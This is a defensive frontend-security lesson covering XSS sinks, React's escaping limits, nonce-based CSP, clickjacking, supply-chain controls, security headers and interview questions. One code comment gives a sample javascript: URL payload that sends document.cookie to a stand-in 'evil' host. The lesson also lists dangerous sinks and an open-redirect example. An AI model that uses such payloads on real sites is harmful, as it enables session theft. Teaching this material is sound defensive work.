> **In one line:** assume some untrusted string will reach your page, and layer defences so that even then it cannot run code, frame your site or smuggle in a hostile dependency. Seniors answer security questions as **code-review checks**, not slogans.

You already know how XSS and CSRF fit into token storage ([Lesson 03](/browser/lesson-3)). This lesson is the practical checklist: the sinks to look for, a Content Security Policy that actually helps, clickjacking, supply chain, and the small headers that remove whole classes of bugs.

## 1. XSS: where it comes from

**Cross-site scripting** happens when untrusted data is interpreted as code in the page. Three flavours:

- **Stored:** the payload is saved (a comment, a profile bio) and served to others.
- **Reflected:** the payload arrives in the URL or a form and is echoed in the response.
- **DOM-based:** client-side code takes data from the URL, `postMessage` or storage and writes it into a dangerous **sink** without a server being involved.

### React's default protection (and its limits)

React escapes anything interpolated with `{value}`, so `<script>` in a string is rendered as harmless text. The protection ends where you opt out or where the *meaning* of the string is not text:

```tsx
// 1. dangerouslySetInnerHTML — you asked for raw HTML
<div dangerouslySetInnerHTML={{ __html: comment.body }} />   // XSS if body is untrusted

// 2. URLs: "javascript:" is a valid href
<a href={user.website}>Website</a>      // website = "javascript:fetch('//evil/'+document.cookie)"

// 3. Refs and direct DOM writes
ref.current.innerHTML = userInput;       // sink
```

### Dangerous sinks to search for in a review

| Sink | Why it is dangerous |
|---|---|
| `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, `insertAdjacentHTML` | Parses a string as HTML |
| `document.write`, `eval`, `new Function`, `setTimeout("string")` | Executes strings as code |
| `href` / `src` / `action` from user data | `javascript:` and `data:` URLs |
| `location = userValue`, `window.open(userValue)` | Open redirects, `javascript:` URLs |
| `postMessage` handlers without an `event.origin` check | Any window can send you data |
| Markdown or rich-text renderers with raw HTML enabled | Passes HTML straight through |
| `target="_blank"` on untrusted links without `rel="noopener"` | Historical tab-nabbing (modern browsers default to `noopener`) |

### Fixes

- Prefer **text** over HTML. Render user content as text whenever possible.
- When HTML is required, **sanitise with an allow-list sanitiser** (DOMPurify on the client; `sanitize-html` or `rehype-sanitize` on the server or in a Markdown pipeline) *at render time*, and configure it with the minimum tags and attributes.
- **Validate URLs:** only allow `http:` and `https:` (`new URL(value).protocol`), not `javascript:`.
- **Markdown:** turn raw HTML off, or sanitise the output with a strict schema. A renderer that lets `<img onerror=...>` through is a classic bug.
- **Output-encode for the context:** HTML body, attribute, JavaScript string and URL need different escaping. A framework does it for you; hand-built strings do not.

```ts
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li", "code", "pre"],
  ALLOWED_ATTR: ["href"],
});
```

## 2. Content Security Policy (CSP)

CSP is a response header that tells the browser **which sources of scripts, styles, images and frames are allowed**. If an injected `<script>` or inline `onerror` is not allowed, it does not run, even when escaping failed. It is **defence in depth**, not a replacement for escaping.

A weak CSP lists many domains and allows `'unsafe-inline'`, which defeats the point. A strong, modern CSP uses **nonces** or hashes:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-r4nd0m123' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  upgrade-insecure-requests
```

- **Nonce:** a fresh random value generated **per response**. The server puts it in the header and on each legitimate `<script nonce="…">`. Injected scripts cannot guess it.
- **`'strict-dynamic'`:** scripts that a nonce-approved script loads are trusted too, so you do not maintain a long domain allow-list.
- **`object-src 'none'`, `base-uri 'none'`:** close off old injection routes.
- **`frame-ancestors`:** who may embed *your* pages in a frame (next section).
- **Report-only first:** deploy `Content-Security-Policy-Report-Only` with a `report-to` endpoint, fix violations, then enforce.

In Next.js, the **proxy** file (called *middleware* before Next.js 16) can generate a nonce per request and set the header; pages read it and pass it to scripts. A fresh nonce on every response means the page must be rendered dynamically, so a nonce-based CSP and fully static pages do not mix.

**Trusted Types** is a related feature (`require-trusted-types-for 'script'`) that makes dangerous DOM sinks reject plain strings, forcing code through sanitising policies. It catches DOM-XSS at the sink.

## 3. Clickjacking

An attacker frames your site in an invisible iframe on their page and tricks the user into clicking a "button" that actually presses yours (confirm payment, delete account).

Defences:

- **`Content-Security-Policy: frame-ancestors 'none'`** (or `'self'`, or an allow-list). This is the modern control.
- The older **`X-Frame-Options: DENY`** (or `SAMEORIGIN`) for legacy support.
- For sensitive actions, also require re-authentication or a confirmation step.

`SameSite` cookies also help: a cross-site frame will not send `Lax`/`Strict` session cookies.

## 4. Supply chain: your dependencies are your code

The average app ships hundreds of transitive packages. Compromise routes: a maintainer's account is taken over, a typosquatted package name, a malicious `postinstall` script, or a **third-party script URL** whose owner changes. A well-known example: in 2024 the `polyfill.io` domain was transferred and began serving malicious JavaScript to the many sites that loaded it directly.

Controls:

| Control | What it does |
|---|---|
| **Lockfile + `npm ci` / `pnpm install --frozen-lockfile`** | Reproducible installs; stops silent version drift |
| **Review dependency updates** (Dependabot or Renovate PRs) | Updates are deliberate, with a diff to read |
| **`npm audit` / SCA scanning in CI** | Flags known vulnerable versions |
| **Minimise dependencies** | Every package is attack surface; do not add one for a 5-line function |
| **Install scripts off where possible** (`--ignore-scripts`, pnpm's script allow-lists) | Blocks arbitrary code at install time |
| **Subresource Integrity (SRI)** on third-party scripts and styles | The browser refuses a file whose hash does not match |
| **Self-host critical scripts** | You control the content and the update timing |
| **Provenance and trusted publishing** | Verifies a package was built from its source repo |
| **Least privilege for CI tokens and secrets** | Limits what a malicious build step can steal |

```html
<script
  src="https://cdn.example.com/lib@3.2.1/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

SRI only works for **pinned, immutable** URLs (a versioned file). If the file changes legitimately, the hash must be updated.

## 5. Small headers, large effect

| Header | Purpose |
|---|---|
| `Strict-Transport-Security` | Force HTTPS for a period; add `includeSubDomains`, consider preload |
| `X-Content-Type-Options: nosniff` | Stop the browser guessing MIME types (blocks some script-via-upload tricks) |
| `Referrer-Policy: strict-origin-when-cross-origin` | Avoid leaking full URLs (with IDs or tokens) to other sites |
| `Permissions-Policy` | Disable features you do not use (camera, microphone, geolocation) |
| `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy` | Isolate your page from other windows; required for some powerful APIs |
| `Cache-Control: no-store` on sensitive pages | Keep private data out of caches and the Back button |

## 6. Other frontend items for a review

- **Secrets in the bundle.** Anything in client code or `NEXT_PUBLIC_*` variables is public. API keys with real power belong on the server.
- **Open redirects.** `?next=https://evil.com` after login. Allow only same-site relative paths or an allow-list.
- **`postMessage`.** Always check `event.origin` and validate the message shape.
- **Authorization in the UI is not security.** Hiding a button does not protect an endpoint; the server must check every request.
- **Untrusted file uploads.** Validate type and size on the server, store outside the web root or on object storage with safe headers.
- **Source maps in production** can reveal logic; decide deliberately.

## The review checklist (what you say in an interview)

1. Is any untrusted string rendered as HTML, used in a URL, or passed to `eval`?
2. Is there a **CSP**, and does it use nonces rather than `'unsafe-inline'`?
3. Can the site be **framed** (`frame-ancestors`)?
4. Are **tokens** stored where JS can read them?
5. Do **third-party scripts** have SRI, version pins or self-hosting?
6. Are **dependencies** locked, audited and minimal?
7. Do cookies have `Secure`, `HttpOnly`, `SameSite`?
8. Are the **security headers** present?
9. Does the **server** enforce authorization independent of the UI?

## Interview questions

### Q1. How does React protect against XSS, and where doesn't it?

React escapes values interpolated into JSX, so strings are treated as text, not markup. It does not protect `dangerouslySetInnerHTML`, direct DOM writes (`innerHTML`), URL attributes that accept `javascript:` schemes, server-rendered strings you build by hand, or vulnerabilities in third-party code. Sanitise HTML, validate URL protocols and use CSP as a backstop.

### Q2. What does a strict CSP look like?

It avoids `'unsafe-inline'` and long allow-lists. It uses a per-response nonce (or hashes) with `'strict-dynamic'` for scripts, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors`, and tightly scoped `connect-src`. Roll it out in report-only mode first, then enforce.

### Q3. Scenario: a markdown renderer is letting scripts through. Fix it.

Disable raw HTML in the Markdown parser, then sanitise the produced HTML with an allow-list (for example `rehype-sanitize` or DOMPurify) before rendering. Block `javascript:` URLs, strip event-handler attributes, and add a CSP so any miss still cannot execute inline script. Add tests with known payloads.

### Q4. How do you defend against a compromised npm package?

Pin and lock versions, install with `npm ci`, review update PRs, run audit and SCA in CI, minimise dependencies, disable install scripts where possible, use SRI for external scripts, restrict secrets available to CI, and monitor for anomalies. Prefer self-hosting critical third-party scripts.

### Q5. What is clickjacking and how do you prevent it?

An attacker frames your page invisibly and tricks users into clicking it. Prevent it with `Content-Security-Policy: frame-ancestors` (or `X-Frame-Options` for legacy), plus confirmation steps for sensitive actions.

### Q6. What is Subresource Integrity?

An `integrity` attribute containing a hash of the expected file. The browser downloads the resource, hashes it and refuses to run it if it does not match. It protects against a CDN or third-party host being tampered with. It needs versioned, unchanging URLs and `crossorigin` for cross-origin files.

### Q7. Why is hiding a button in the UI not authorization?

Anyone can call your API directly. Authorization must be enforced on the server for every request. UI checks are only a convenience for honest users.

### Q8. What is the difference between stored, reflected and DOM-based XSS?

Stored XSS persists on the server and hits every viewer; reflected XSS is echoed from a request into the response (often via a crafted link); DOM-based XSS happens entirely in client code reading from a source (URL, storage, `postMessage`) and writing to a sink. The fixes differ slightly, but escaping output, sanitising and CSP apply to all three.

### Q9. Scenario: marketing wants to add a new tag manager to the site. How do you assess the security risk?

A tag manager lets people ship arbitrary JavaScript to every visitor, so treat it as part of the attack surface. Limit who can publish, require review and an audit log, run it under a strict CSP with an allow-list of destinations, use SRI or self-hosting where possible, keep it off sensitive pages (login, checkout), measure its performance cost and be ready to disable it quickly if a tag misbehaves.

## Key takeaways

- **Sinks** (`innerHTML`, `dangerouslySetInnerHTML`, `javascript:` URLs, `eval`) are where XSS lives. Find them in review.
- **Sanitise with an allow-list**; do not hand-roll regexes.
- A **nonce-based CSP** plus `frame-ancestors` is the modern baseline; deploy report-only first.
- Treat **dependencies and third-party scripts** as part of your attack surface: lock, audit, minimise, SRI.
- Send the small headers: HSTS, `nosniff`, `Referrer-Policy`, `Permissions-Policy`.
- **Authorization lives on the server.**
